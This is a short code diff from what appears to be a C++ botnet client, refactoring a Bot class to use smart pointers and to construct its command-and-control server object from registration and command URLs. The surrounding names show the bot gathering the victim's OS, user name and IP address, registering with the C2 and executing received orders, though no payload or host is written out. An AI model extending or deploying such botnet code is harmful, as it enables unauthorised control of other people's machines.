@@ -1,6 +1,7 @@
 #include <string>
 #include <fstream>
 #include <random>
+#include <memory>
 #include "request.hh"
 #include "system.hh"
 #include "constants.hh"
@@ -88,12 +89,11 @@ void Seed::calcHash (std::ifstream& seedFile) {
 
 class Bot {
 public:
-    Bot(const std::string& seedPath, C2Server* server) {
+    Bot(const std::string& seedPath, const std::string& regUrl, const std::string& cmdUrl) {
         _hashType = HASH_TYPE;
-        _seed = new Seed(seedPath);
-        _c2Server = server;
+        _seed = std::make_unique<Seed>(seedPath);
+        _c2Server = std::make_unique<C2Server>(regUrl, cmdUrl);
     }
-    ~Bot() { delete _seed; }
     void executeOrder();
 
     void init();
@@ -101,8 +101,8 @@ public:
 
 private:
     std::string _hashType, _hashSum, _os, _user, _ipAddr;
-    Seed* _seed;
-    C2Server* _c2Server;
+    std::unique_ptr<Seed> _seed;
+    std::unique_ptr<C2Server> _c2Server;
 
     void _prepareSysInfo();
     void _registerBot();
